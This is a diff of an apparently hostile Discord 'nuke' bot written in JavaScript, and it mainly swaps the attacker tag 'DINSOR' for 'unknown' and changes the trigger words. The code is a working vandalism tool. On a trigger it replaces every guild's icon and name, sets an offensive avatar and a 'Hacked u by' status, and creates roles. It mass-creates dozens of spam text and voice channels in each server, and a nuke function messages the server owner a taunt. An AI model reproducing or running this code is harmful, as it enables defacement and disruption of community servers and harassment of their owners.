@@ -33,20 +33,20 @@ LOka.on("message", message => {
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/496813693842096160/504268887458840587/Aww_my_middle_finger_with_stickers.png`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by Dinsor Is here")
+LOka.user.setUsername("Hacked u by unknown Is here")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by Dinsor Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -54,14 +54,14 @@ LOka.user.setGame(`Hacked u by Dinsor Is here`,'https://www.twitch.tv/hix')
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/496813693842096160/504268887458840587/Aww_my_middle_finger_with_stickers.png`)
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 })
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by Dinsor Is here`)
+             m.setName(`Hacked u by unknown Is here`)
 })
 }
 });
@@ -70,7 +70,7 @@ LOka.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/496813693842096160/504268887458840587/Aww_my_middle_finger_with_stickers.png`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
@@ -78,7 +78,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "??? ?????") {
+     if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked u by unknown Is here",
@@ -284,143 +284,121 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "??? ????") {
+         if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
-m.createChannel('Hacked u by DINSOR Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
  
 })
 }
 });
  
 LOka.on('message', message => {
-         if (message.content === "??? ????") {
+         if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
  
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
  
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
  
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
  
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
-m.createChannel('Hacked u by DINSOR Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
  
  
  
@@ -439,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send('Hacked U BY DINSOR').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
  
  
  
